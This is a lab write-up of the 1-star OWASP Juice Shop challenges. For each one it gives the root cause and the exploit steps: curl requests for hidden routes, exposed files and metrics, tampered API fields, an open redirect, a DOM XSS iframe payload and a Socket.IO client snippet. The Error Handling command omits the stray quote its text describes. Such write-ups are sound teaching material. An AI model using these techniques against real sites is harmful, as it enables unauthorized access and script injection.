<!--
  1-Star Challenge Writeups — OWASP Juice Shop (v20.2.0, MultiJuicer)
  Companion doc to JUICE.md "1-Star Findings" (#1-13).
  Register cross-check (JUICE.md line "★ (13):"): the register lists exactly these
  13 names (Mass Dispel, Confidential Document, Error Handling, Exposed Metrics,
  DOM XSS, Missing Encoding, Repetitive Registration, Privacy Policy, Outdated
  Allowlist, Score Board, Web3 Sandbox, Bonus Payload, Zero Stars) — no omissions,
  no duplicates. This file documents 13/13 in the same order as JUICE.md findings.
-->
# 1-Star Challenges — Writeups

Summary: 1. Score Board · 2. Confidential Document · 3. Error Handling · 4. Zero Stars ·
5. Exposed Metrics · 6. Missing Encoding · 7. Repetitive Registration · 8. Outdated Allowlist ·
9. DOM XSS · 10. Bonus Payload · 11. Privacy Policy · 12. Mass Dispel · 13. Web3 Sandbox.

> **Prerequisites:** Instance is OWASP Juice Shop v20.2.0 served behind the MultiJuicer
> reverse proxy. Every HTTP request must carry the team proxy cookie
> `Cookie: multi-juicer=<team-cookie>`, otherwise any path `302`s to `/multi-juicer`.
> In the examples below the proxy origin is `<proxy-host>` and all requests assume the
> cookie; no auth (JWT) is needed for any of these 13 challenges. Live cookie/passcode/
> host values are intentionally `<redacted>`.

## 1. Score Board
Difficulty: ★ | Vulnerability class: Broken Access Control — hidden resource (CWE-425)
- Attack surface: SPA route `/#/score-board`; client bundle `main.js`
- Root cause: The route table is shipped unauthenticated in `main.js`, and no RBAC/guard
  protects the hidden page — it exists for anyone who knows (or finds) the path.
- Exploit:
  1. Pull the client bundle and look for route strings:
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' https://<proxy-host>/main.js | grep -o 'score-board'
     ```
  2. Navigate directly to the hidden route (no login required):
     ```
     https://<proxy-host>/#/score-board
     ```
- Verification: The Score Board page loads and its tile turns green.

## 2. Confidential Document
Difficulty: ★ | Vulnerability class: Sensitive Data Exposure (CWE-552)
- Attack surface: `/robots.txt`, `/ftp`, `/ftp/acquisitions.md`
- Root cause: `/ftp` is exposed with directory listing enabled, and crawler
  disallow-lists in `robots.txt` advertise exactly where the interesting files live.
- Exploit:
  1. Read the crawler policy:
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' https://<proxy-host>/robots.txt
     ```
  2. List the `/ftp` directory:
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' https://<proxy-host>/ftp
     ```
  3. Download the confidential document found in the listing:
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' https://<proxy-host>/ftp/acquisitions.md
     ```
- Verification: File contents returned; challenge solved (tile green on score board).

## 3. Error Handling
Difficulty: ★ | Vulnerability class: Information Exposure Through an Error Message (CWE-209)
- Attack surface: any route that bubbles an unhandled exception, e.g. `/rest/products/search`
- Root cause: Production is left with the development error handler: raw Sequelize/SQLite
  stack traces are rendered into the HTML response along with the Express `^4.22.1`
  version banner (as fingerprinted in JUICE.md).
- Exploit:
  1. Provoke a SQL error with a stray quote in the search term:
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' 'https://<proxy-host>/rest/products/search?q='
     ```
  2. Inspect the response body: it is an HTML error page exposing the raw SQLite
     stack trace (Sequelize internals) and the Express banner.
- Verification: A 500-style page with the leaked stack trace is returned; challenge solved.

## 4. Zero Stars
Difficulty: ★ | Vulnerability class: Improper Input Validation (CWE-20) + broken CAPTCHA
- Attack surface: `GET /rest/captcha/`, `POST /api/Feedbacks/`
- Root cause: The star-rating bounds are only enforced in the UI — `rating: 0` is accepted
  by the API. The arithmetic CAPTCHA is also weak by design: the endpoint returns the
  answer in plaintext JSON alongside the challenge.
- Exploit:
  1. Obtain a CAPTCHA (response contains `captchaId`, `captcha`, and the plaintext `answer`):
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' https://<proxy-host>/rest/captcha/
     ```
  2. Submit feedback with `rating: 0` and the solved CAPTCHA (anonymous POST is allowed):
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' \
       -H 'Content-Type: application/json' \
       -d '{"comment":"not even one star","rating":0,"captchaId":<id>,"captcha":"<answer>"}' \
       https://<proxy-host>/api/Feedbacks/
     ```
- Verification: The zero-star feedback is stored (no 401/validation error); challenge solved.

## 5. Exposed Metrics
Difficulty: ★ | Vulnerability class: Exposure of Sensitive Information (CWE-200)
- Attack surface: `GET /metrics`
- Root cause: The Prometheus metrics endpoint is mounted unauthenticated on its default
  path; no auth middleware or IP allow-list is applied (it is reachable without any JWT).
- Exploit:
  ```bash
  curl -s -b 'multi-juicer=<team-cookie>' https://<proxy-host>/metrics
  ```
- Verification: The response is Prometheus text-format usage/process metrics
  (no `401 No Authorization header was found`); challenge solved.

## 6. Missing Encoding
Difficulty: ★ | Vulnerability class: Improper URL Encoding / Broken Link (CWE-116)
- Attack surface: Photo Wall image URLs (`/assets/public/images/uploads/...`)
- Root cause: Photo filenames contain a literal `#` (and non-ASCII characters) that are
  never URL-encoded when referenced. `#` starts the URI fragment, so browsers truncate
  the request and the image "cannot be loaded correctly" on the Photo Wall.
- Exploit:
  1. Inspect the Photo Wall entry for Bjoern's cat that fails to render; its `src` breaks
     at the `#` in the filename.
  2. Request the file with every reserved/raw character percent-encoded (`#` → `%23`):
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' \
       'https://<proxy-host>/assets/public/images/uploads/%e1%93%9a%e1%98%8f%e1%97%a2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg'
     ```
- Verification: HTTP 200 and the photo (cat in "melee combat-mode") is retrieved;
  challenge solved.

## 7. Repetitive Registration
Difficulty: ★ | Vulnerability class: Client-side-only validation (CWE-602)
- Attack surface: `POST /api/Users/`
- Root cause: The "Repeat Password" (`passwordRepeat`) equality check exists only in the
  browser form; the server-side registration accepts any `passwordRepeat`, so the field
  provides no real validation (the DRY/repetition protection is bypassable).
- Exploit:
  1. Register normally to learn the request shape, then re-issue the POST with the repeat
     field tampered:
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' \
       -H 'Content-Type: application/json' \
       -d '{"email":"<new-email>@juice-sh.op","password":"<some-password>","passwordRepeat":"<different-value>"}' \
       https://<proxy-host>/api/Users/
     ```
  2. `passwordRepeat` need not equal `password` (or may be empty) — the request is not
     rejected on that basis server-side.
- Verification: The solver trips on the mismatched repeat field; challenge solved without
  any client-side check being hit.

## 8. Outdated Allowlist
Difficulty: ★ | Vulnerability class: Unvalidated Redirects and Forwards (CWE-601)
- Attack surface: redirect endpoint `/redirect?to=<url>`
- Root cause: The redirect allowlist still contains legacy crypto-currency donation URLs
  (blockchain.info, explorer.dash.org, etherscan.io address pages from the pinned release's
  `lib/insecurity.ts`) that are no longer promoted anywhere in the UI — the developers
  removed the references from the code/links but never cleaned up the allowlist.
- Exploit:
  1. Recover the still-allowlisted legacy donation URLs (they survive in the client bundle
     `main.js` / pinned source but are no longer linked in the shop).
  2. Ask the server to redirect to one of them (allowlist match → redirect is issued):
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' \
       'https://<proxy-host>/redirect?to=https://explorer.dash.org/address/<legacy-donation-address>'
     ```
     (the blockchain.info / etherscan.io legacy donation URLs work identically)
- Verification: The server follows the redirect instead of answering
  `406 Unrecognized target URL`; challenge solved. Note: merely visiting the donation link
  directly does not solve it — the request must go through the redirect endpoint.

## 9. DOM XSS
Difficulty: ★ | Vulnerability class: DOM-based XSS (CWE-79)
- Attack surface: `/#/search` (search box / `q` sink rendered via `bypassSecurityTrustHtml`)
- Root cause: The search term is injected into the page as trusted HTML (Angular
  `bypassSecurityTrustHtml`), so an unescaped `<iframe>` in the query is executed in the
  DOM instead of being treated as text.
- Exploit:
  1. Open the search page:
     ```
     https://<proxy-host>/#/search
     ```
  2. Type the payload into the search box and submit (do not URL-encode it):
     ```
     <iframe src="javascript:alert(`xss`)">
     ```
  3. The frontend detects the payload and emits `verifyLocalXssChallenge` over Socket.IO,
     which the server-side solve handler matches.
- Verification: The alert-bearing iframe executes (DOM XSS) and the score-board tile turns
  green.

## 10. Bonus Payload
Difficulty: ★ | Vulnerability class: DOM-based XSS with configured payload (CWE-79)
- Attack surface: `/#/search` (same sink as DOM XSS)
- Root cause: The app ships a "bonus" XSS payload in its configuration — an allowed
  SoundCloud embed `<iframe>`; submitting that exact payload as the search term counts as
  an XSS trigger because the solver compares the emitted term against the configured
  `xssBonusPayload`.
- Exploit:
  1. Solve DOM XSS first (challenge #9), then paste the configured SoundCloud iframe into
     the search box and submit:
     ```
     <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
     ```
  2. The embed is rendered (and plays — the payload is a live SoundCloud track) while the
     frontend reports the term over Socket.IO.
- Verification: The SoundCloud player renders in the search result and the score-board tile
  for Bonus Payload turns green.

## 11. Privacy Policy
Difficulty: ★ | Vulnerability class: — (no flaw; security-awareness/tutorial)
- Attack surface: SPA route `/#/privacy-security/privacy-policy`
- Root cause: None — this challenge only requires actually reading the policy page.
- Exploit:
  1. Navigate to the privacy policy route:
     ```
     https://<proxy-host>/#/privacy-security/privacy-policy
     ```
  2. Let the page load (a crawler/spider visiting the route would also solve it).
- Verification: Score-board tile turns green after the route is visited.

## 12. Mass Dispel
Difficulty: ★ | Vulnerability class: Missing server-side validation of a client convenience event (CWE-602)
- Attack surface: Socket.IO endpoint (`/socket.io`), event `verifyCloseNotificationsChallenge`
- Root cause: "Close all solved-notifications" is implemented as a client-emitted
  Socket.IO event that the server relays/solves on with no authenticity or count check.
  Any client that emits it with more than one notification payload gets all of them
  dismissed (and the challenge solved).
- Exploit:
  1. Build up >1 pending "Challenge solved" notifications (easiest right after an instance
     restart, or by replaying solved-challenge notifications).
  2. Connect a raw Socket.IO client and emit the event with an array of length > 1:
     ```js
     // node -e "..."
     const { io } = require('socket.io-client')
     const s = io('https://<proxy-host>', { extraHeaders: { Cookie: 'multi-juicer=<team-cookie>' } })
     s.on('connect', () => s.emit('verifyCloseNotificationsChallenge', ['close','close']))
     ```
     (Clicking the UI's "close all" with several stacked notifications fires the same event.)
- Verification: Multiple notifications are cleared in one go and the Mass Dispel tile turns
  green.

## 13. Web3 Sandbox
Difficulty: ★ | Vulnerability class: Broken Access Control — unlinked dev route (CWE-425)
- Attack surface: SPA route `/#/web3-sandbox`
- Root cause: A developer/testing page (an online smart-contract code sandbox) was shipped
  in the SPA but left unlinked and without any access control — reachable by anyone who
  finds the route (it shows up in the `main.js` route table, exactly like the Score Board).
- Exploit:
  1. Discover the route string in the client bundle:
     ```bash
     curl -s -b 'multi-juicer=<team-cookie>' https://<proxy-host>/main.js | grep -o 'web3-sandbox'
     ```
  2. Navigate directly to the unlinked dev route:
     ```
     https://<proxy-host>/#/web3-sandbox
     ```
- Verification: The sandbox page loads (no login gate) and the challenge tile turns green.
